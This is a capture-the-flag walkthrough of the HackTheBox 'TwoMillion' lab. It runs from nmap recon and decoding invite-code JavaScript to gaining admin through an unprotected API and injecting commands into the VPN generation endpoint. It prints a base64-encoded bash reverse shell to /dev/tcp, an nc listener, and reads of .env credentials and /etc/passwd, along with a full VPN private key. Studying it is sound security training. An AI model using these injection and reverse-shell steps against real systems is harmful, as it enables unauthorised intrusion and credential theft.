# Two Million

1. Reconnaissance:

Target IP: 10.129.229.66
Port scans:

```
└─$ nmap -sC -sV -Pn 10.129.229.66       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-26 14:20 +0700
Nmap scan report for 10.129.229.66
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
--> SSH service
--> HTTP web

Adding address to etc/hosts:

```
10.129.229.66 2million.htb
```

### Task 2: What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?

--> Entering 2million.htb we can see an penetration testing labs interface where im guessing we have to get the invite code to pass.
--> Going further into the /login and inspecting the web elements we can see an inviteapi.min.js responsible for handling the invite code

```
<script defer src="/js/inviteapi.min.js"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
	                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
```

### Task 3: What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.

--> Looking closer at the inviteapi.min script:

```
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```
After looking at the hint i see that this javascript seesm to be obfuscated, a quick claude command help me decode this code:

```
function verifyInviteCode(code) {
    var formData = { "code": code };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) { console.log(response) },
        error:   function (response) { console.log(response) }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) { console.log(response) },
        error:   function (response) { console.log(response) }
    })
}
```

-> The first function is used to verify the code, the second one can make a post request to /api/v1/invite/how/to/generate

--> This endpoint seems very interesting, so in order to access it we can either call this JavaScript function from our browser's console, or use cURL. I will do both:

1st : running makeInvideCode() in the console tab of the web i get:
2nd: you can use the cURL command: 

```
curl -sX POST http://2million.htb/api/v1/invite/how/to/generate | jq
```
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
​

```
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }

data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
​​
enctype: "ROT13"
​​
```
​
--> We can see an ROT13 encrypted message we can put this through dcode.fr to get the decrypted message:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```
--> Here we can use the same cURL command to send the post request:

```
curl -sX POST http://2million.htb/api/v1/invite/generate | jq
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -sX POST http://2million.htb/api/v1/invite/generate | jq
{
  "0": 200,
  "success": 1,
  "data": {
    "code": "MTRKMTgtODhJSjQtMkNOTDAtVFhNNTc=",
    "format": "encoded"
  }
}
     
```
--> We can see that this is encrypted in binary: 14J18-88IJ4-2CNL0-TXM57. Let's put it into the /invite page:

--> We are redirected to http://2million.htb/register and i registed with the credential:
testing / testing@2million.htb / testingtesting

--> After that we can log into the website

### Task 5: What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?

Reading the questions i wander around the website to find this connection pack button: --> its in http://2million.htb/home/access 

--> After that a quick inspect on the connection pack gets me: /api/v1/user/vpn/generate

Opening burp suite we can see more clearly what that button does: 

```
GET /home/access HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8
Connection: keep-alive
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v 2million.htb/api
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.66
*   Trying 10.129.229.66:80...
* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.15.183 port 37004 
* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 401 Unauthorized
< Server: nginx
< Date: Mon, 26 Oct 2026 08:19:04 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< Set-Cookie: PHPSESSID=lash4e7usa592gjgg5e179qrib; path=/
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
* Connection #0 to host 2million.htb:80 left intact

```
--> We get an unauthozed 401 code: --> Now lets try again using out phpsessid: PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v 2million.htb/api --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" | jq
* Host 2million.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.129.229.66
*   Trying 10.129.229.66:80...
* Established connection to 2million.htb (10.129.229.66 port 80) from 10.10.15.183 port 52984 
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0* using HTTP/1.x
> GET /api HTTP/1.1
> Host: 2million.htb
> User-Agent: curl/8.21.0
> Accept: */*
> Cookie: PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: nginx
< Date: Mon, 26 Oct 2026 08:22:11 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< Expires: Thu, 19 Nov 1981 08:52:00 GMT
< Cache-Control: no-store, no-cache, must-revalidate
< Pragma: no-cache
< 
{ [47 bytes data]
100     36   0     36   0      0     85      0                              0
* Connection #0 to host 2million.htb:80 left intact
{
  "/api/v1": "Version 1 of the API"
}

```

--> Let's do the same for for /api/v1: 

```
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
      
```

--> We get a list of quite a few endpoints that are available in the API, with some of the most interesting ones being the admin specific endpoints. As a test we can hit the /admin/auth endpoint to check if we are an admin user.

```
{
  "message": false
}
```

--> We can confirm that our account is not admin --> we can see that /apt/v1/admin/settings/update can be used to change user to admin.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v -X PUT  2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" | jq
{
  "status": "danger",
  "message": "Invalid content type."
}

```
--> Interestingly enough, this time we do not get an Unauthorized error, but instead the API replies with Invalid content type . It is often for APIs to use JSON for sending and receiving data, and we already know that the API replies in JSON, so lets set the Content-Type header to JSON and try again.

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v -X PUT  2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json"  | jq

{
  "status": "danger",
  "message": "Missing parameter: email"
}
          
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v -X PUT  2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json" --data '{"email":"testing@2million.htb"}'  | jq 
{
  "status": "danger",
  "message": "Missing parameter: is_admin"
}

```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v -X PUT  2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json" --data '{"email":"testing@2million.htb", "is_admin": true}'  | jq

{
  "status": "danger",
  "message": "Variable is_admin needs to be either 0 or 1."
}
                                                                                                     
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -v -X PUT  2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json" --data '{"email":"testing@2million.htb", "is_admin": 1}'  | jq   

{
  "id": 13,
  "username": "testing",
  "is_admin": 1
}
        
```

**FOOTHOLD:

--> Checking /admin/vpn/generate:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json" --data '{"username":"testing"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 3 (0x3)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Oct 26 08:53:04 2026 GMT
            Not After : Oct 26 08:53:04 2027 GMT
        Subject: C=GB, ST=London, L=London, O=testing, CN=testing
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:d4:44:72:18:b4:bd:a3:c3:d7:a2:3e:09:08:dd:
                    2e:0b:16:d0:b3:c6:81:a2:d8:90:22:4d:0b:b4:93:
                    74:d1:f1:a3:53:d3:20:9d:a6:90:2b:f1:af:39:ee:
                    24:0a:99:6e:a5:24:b2:2c:d6:4a:85:bf:b3:b5:5a:
                    99:2f:73:fc:cc:bd:d5:d6:74:aa:13:5d:a5:e4:07:
                    58:6b:20:35:d6:5b:55:76:6f:36:c0:a1:55:61:70:
                    25:b3:3b:87:07:ea:1d:d2:23:85:55:61:06:e1:d0:
                    f4:bb:d2:7e:1b:25:e8:5e:28:bf:4b:56:71:59:b3:
                    df:41:74:8b:18:ad:62:f5:7f:d8:ca:87:8f:27:0a:
                    2a:b5:b7:d3:24:1a:a7:28:96:46:a3:d1:d2:06:3c:
                    b4:18:da:ab:e2:c1:66:6a:ed:92:a7:b7:1b:c5:31:
                    80:d8:b2:64:d4:1e:2c:e0:59:a8:6d:a7:64:b5:34:
                    77:b7:a2:44:ef:75:7f:a8:f7:b7:1a:85:e1:5a:d8:
                    fa:87:91:93:c0:10:c0:bf:25:e9:b1:2c:0a:75:5f:
                    61:dd:7e:09:da:75:28:9f:98:2b:b4:1b:45:07:7f:
                    e3:ae:c9:1a:14:f2:ae:3a:d1:d6:30:44:c4:0b:72:
                    32:bb:6e:90:8d:16:70:06:5e:90:24:d1:dc:d0:24:
                    58:23
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                3A:24:5C:37:A8:EA:2D:1F:49:73:11:44:FD:8E:8F:58:BD:11:4A:9E
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        12:93:0d:96:32:1b:e4:30:05:5f:7f:f3:21:48:fe:02:61:42:
        ce:a2:39:fb:c8:cc:44:74:c7:ee:e5:65:89:fc:00:14:fb:90:
        3f:3b:09:2c:69:83:bc:9a:dc:9f:95:4a:b2:92:d7:22:03:dc:
        c5:ef:a2:e6:d0:2c:58:89:32:1a:52:53:ac:51:95:f3:d8:cc:
        44:b1:3f:ce:54:10:0f:a3:94:68:6b:88:fc:97:24:ab:22:af:
        30:e3:fd:a0:1c:76:f2:b4:d1:5a:bd:e8:d1:f9:9d:06:84:5a:
        3b:2b:93:1f:27:60:4e:f5:de:77:38:6f:7e:a9:61:14:46:1b:
        49:ad:2c:aa:25:c5:81:d4:74:01:64:dc:59:a3:71:8c:83:6c:
        6d:40:83:d2:00:d9:90:da:16:74:9d:73:04:8f:0a:7a:d8:94:
        96:97:9f:59:18:76:8a:29:f4:86:bc:5c:45:0b:ae:1e:3a:52:
        fe:c8:ff:d9:5f:99:e3:d8:7d:da:22:91:d8:6f:51:36:c0:82:
        c7:4a:63:04:e8:0c:9b:63:a1:69:f6:03:b2:66:f0:a5:e3:54:
        64:c8:1a:b1:e9:63:63:50:d5:a7:88:2f:f3:fd:7f:6b:60:82:
        11:8a:9f:af:88:80:25:ec:b5:af:00:67:f4:00:57:4d:c0:cd:
        d8:14:e2:2b:ac:64:d0:67:d7:ea:93:f8:19:8e:97:d8:1a:35:
        f4:26:da:b3:79:eb:3a:03:a1:39:99:4c:a3:8c:c0:a4:66:0c:
        29:46:38:ae:0e:08:99:96:79:08:73:69:c1:42:e4:37:29:95:
        38:1a:f8:17:2a:b5:b3:98:d5:2f:17:63:26:06:0e:93:47:35:
        f5:ee:3a:d0:a4:f3:01:fe:bf:e6:94:7f:8d:ea:3b:6f:bb:e4:
        33:a0:b1:4e:ae:3a:a2:9a:40:85:f2:8d:b3:d6:3b:d0:62:ad:
        07:c2:b7:3e:65:ab:c2:e1:11:29:42:7e:d2:24:76:62:db:f8:
        87:73:d3:36:3e:20:4a:1d:3f:e7:4c:00:57:16:fd:38:4b:a8:
        c3:26:f4:c0:e1:72:f7:ff:0d:0d:ff:1e:35:2c:f9:9a:93:3b:
        c3:d3:69:31:f0:a1:c5:bd:ba:a6:fe:18:ab:43:c1:09:14:7a:
        d2:24:33:87:77:33:5b:2d:c5:d8:11:ee:62:5e:7e:95:de:48:
        80:24:58:b1:f2:8a:e9:9b:bc:d4:24:c3:69:75:f2:a1:56:36:
        61:dc:55:55:b6:a4:d3:72:d0:a7:73:20:77:6a:bb:c3:77:fb:
        66:8c:ac:69:90:d1:13:2e:d3:ab:ac:df:54:42:f3:44:e2:e1:
        e8:f2:4e:25:9d:ef:18:a8
-----BEGIN CERTIFICATE-----
MIIE4TCCAsmgAwIBAgIBAzANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjYxMDI2MDg1MzA0WhcNMjcx
MDI2MDg1MzA0WjBTMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xEDAOBgNVBAoMB3Rlc3RpbmcxEDAOBgNVBAMMB3Rlc3Rpbmcw
ggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDURHIYtL2jw9eiPgkI3S4L
FtCzxoGi2JAiTQu0k3TR8aNT0yCdppAr8a857iQKmW6lJLIs1kqFv7O1Wpkvc/zM
vdXWdKoTXaXkB1hrIDXWW1V2bzbAoVVhcCWzO4cH6h3SI4VVYQbh0PS70n4bJehe
KL9LVnFZs99BdIsYrWL1f9jKh48nCiq1t9MkGqcolkaj0dIGPLQY2qviwWZq7ZKn
txvFMYDYsmTUHizgWahtp2S1NHe3okTvdX+o97caheFa2PqHkZPAEMC/JemxLAp1
X2HdfgnadSifmCu0G0UHf+OuyRoU8q460dYwRMQLcjK7bpCNFnAGXpAk0dzQJFgj
AgMBAAGjgYkwgYYwHQYDVR0OBBYEFDokXDeo6i0fSXMRRP2Oj1i9EUqeMB8GA1Ud
IwQYMBaAFHpi3R22/krI4/if+qz0FQyWui6RMAkGA1UdEwQCMAAwCwYDVR0PBAQD
AgH+MCwGCWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0
ZTANBgkqhkiG9w0BAQsFAAOCAgEAEpMNljIb5DAFX3/zIUj+AmFCzqI5+8jMRHTH
7uVlifwAFPuQPzsJLGmDvJrcn5VKspLXIgPcxe+i5tAsWIkyGlJTrFGV89jMRLE/
zlQQD6OUaGuI/JckqyKvMOP9oBx28rTRWr3o0fmdBoRaOyuTHydgTvXedzhvfqlh
FEYbSa0sqiXFgdR0AWTcWaNxjINsbUCD0gDZkNoWdJ1zBI8KetiUlpefWRh2iin0
hrxcRQuuHjpS/sj/2V+Z49h92iKR2G9RNsCCx0pjBOgMm2OhafYDsmbwpeNUZMga
seljY1DVp4gv8/1/a2CCEYqfr4iAJey1rwBn9ABXTcDN2BTiK6xk0GfX6pP4GY6X
2Bo19Cbas3nrOgOhOZlMo4zApGYMKUY4rg4ImZZ5CHNpwULkNymVOBr4Fyq1s5jV
LxdjJgYOk0c19e460KTzAf6/5pR/jeo7b7vkM6CxTq46oppAhfKNs9Y70GKtB8K3
PmWrwuERKUJ+0iR2Ytv4h3PTNj4gSh0/50wAVxb9OEuowyb0wOFy9/8NDf8eNSz5
mpM7w9NpMfChxb26pv4Yq0PBCRR60iQzh3czWy3F2BHuYl5+ld5IgCRYsfKK6Zu8
1CTDaXXyoVY2YdxVVbak03LQp3Mgd2q7w3f7ZoysaZDREy7Tq6zfVELzROLh6PJO
JZ3vGKg=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDURHIYtL2jw9ei
PgkI3S4LFtCzxoGi2JAiTQu0k3TR8aNT0yCdppAr8a857iQKmW6lJLIs1kqFv7O1
Wpkvc/zMvdXWdKoTXaXkB1hrIDXWW1V2bzbAoVVhcCWzO4cH6h3SI4VVYQbh0PS7
0n4bJeheKL9LVnFZs99BdIsYrWL1f9jKh48nCiq1t9MkGqcolkaj0dIGPLQY2qvi
wWZq7ZKntxvFMYDYsmTUHizgWahtp2S1NHe3okTvdX+o97caheFa2PqHkZPAEMC/
JemxLAp1X2HdfgnadSifmCu0G0UHf+OuyRoU8q460dYwRMQLcjK7bpCNFnAGXpAk
0dzQJFgjAgMBAAECggEACZAV1dAatQyHI+uIi6ovP1elSlwYjgYUpD71VorIGgc5
VPbvgrq0xw4J12HHpOSZq/31uvhifhkPVw3AVfdzPaQVxKYX3Wx8I0RDcvwOANy3
gnDrNg1uo8eiIyt831noQwXPpXOMFFNOG0IV5VI1YDyUtaeszp5AYhoGhDOXgDjP
s/ewU7kYh2d/5jlU2U4uEB7VMG9KCSM2a5GESuOwJCTb4rtuFsLlD+kAVJKsLHqb
3L1fzRimWJL7de3NpIRI2bfqdDeUJgX+Tgxqvc0nYYQfzduRc7tyyj+OpJ7VGvwq
WF9Dj4XlFtoAt14/oz67LldWFvB4Ei6w4AkULlwXNQKBgQDY4qhzyHcp6zsa5NPF
NRiPDj960LS8Q7/ux4gPbtuLEdVvDqflxHPI2a7++vHTbp2m5YM1TXuxnEmTmcJJ
dQvTFcFyqa438SEfmR6/GTRhJikLQwuWoWQpwhsXXkAOEd+BQHkVFRm0TwNN0PCn
/4hDrd1+T1lYG9CWWoLE7axhTwKBgQD6jJRMGx+eYSL+78po2qWzORCwJX4K9R7w
XmIlqC8S1BfdCzjav4i3DCkDXDx1ISHnI9H8ysn6cUYEhKw1plmjnvuu331GFGAa
L856j6cYc7cRt4E05gKv5vPrcCFiPd9kKWpBBMAU87t+rCc9FQeBzAPrao+HRvXu
dJqYeake7QKBgAYbE2z3BsvKUIaoTIHvxbo5R3Y4q+3k5mFdgqoUj9+xZ9XRjs58
IlpULoYFIIu4QH3zVidJACN25+dc28hfoC6YHTMSLdJrWmheUixFFGFrxpoHkCr0
bjJywXp978W1oRota3s5ddjKpKgrKqtAGWD2YxbsOvKtDck90RKkMkcnAoGBAK16
IsAjU5w0w6di3nIFWg+i5mQgQYpSuE5T+375WUafJbq+J2qGjaG4QLl75rxu6WuC
CMYQnxLR1VoRhq9K8+vvi3JEehfIydW33i5MQrUSgeI5fbPjwl6K+b69j8/W6VMP
vesw39JiBCMsDaskYWNEoD4jNSfEQUoO4G/MZQXtAoGAKoktKIkXW9l05n0TIw0y
KFBrYkvZLDQcnVp8oItnOp2RRn/w38l9pV9BqCHGS7MQY/mEjWkNk8bXxMEzG2LO
uX40347srubNbLWDhUgM9oupwEtI2DRdBJOt9yJ3yFQGvIw3hg30tfBOWrJhfaGY
/xoKByfGJnARx9gPvD+j9jU=
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>

```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json" --data '{"username":"testing;id;"}' 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
                                                            
```

```
nc -lvp 1234
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=ogvm1glk8voi5vcb9vrf24hqu8" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xODMvMTIzNCAwPiYxCg== | base64 -d | bash;"}'

```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nc -lvp 1234 
listening on [any] 1234 ...

connect to [10.10.15.183] from 2million.htb [10.129.229.66] 52884
bash: cannot set terminal process group (1095): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

```

```
www-data@2million:~/html$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
